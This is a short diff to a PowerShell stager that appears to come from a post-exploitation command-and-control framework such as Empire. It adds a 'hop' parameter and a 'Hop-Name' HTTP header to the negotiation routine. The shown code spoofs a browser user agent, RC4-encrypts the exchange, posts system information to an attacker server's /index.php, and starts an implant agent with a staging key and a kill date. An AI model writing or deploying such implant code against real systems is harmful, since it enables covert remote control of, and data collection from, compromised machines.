@@ -1,5 +1,5 @@
 function Start-Negotiate {
-    param($s,$SK,$UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko')
+    param($s,$SK,$UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',$hop)
     
     function ConvertTo-RC4ByteStream {
         Param ($RCK, $In)
@@ -222,6 +222,7 @@ function Start-Negotiate {
         }
     }
     $wc.Headers.Add("User-Agent",$UA);
+    $wc.Headers.Add("Hop-Name",$hop);
 
     # step 5 of negotiation -> client posts nonce+sysinfo and requests agent
     $raw=$wc.UploadData($s+"/index.php","POST",$rc4p2);
@@ -239,4 +240,4 @@ function Start-Negotiate {
     Invoke-Agent -Servers @(($s -split "/")[0..2] -join "/") -StagingKey $SK -SessionKey $key -SessionID $ID -WorkingHours "WORKING_HOURS_REPLACE" -KillDate "REPLACE_KILLDATE" -ProxySettings $Script:Proxy;
 }
 # $ser is the server populated from the launcher code, needed here in order to facilitate hop listeners
-Start-Negotiate -s "$ser" -SK 'REPLACE_STAGING_KEY' -UA $u;
+Start-Negotiate -s "$ser" -SK 'REPLACE_STAGING_KEY' -UA $u -hop "$hop";
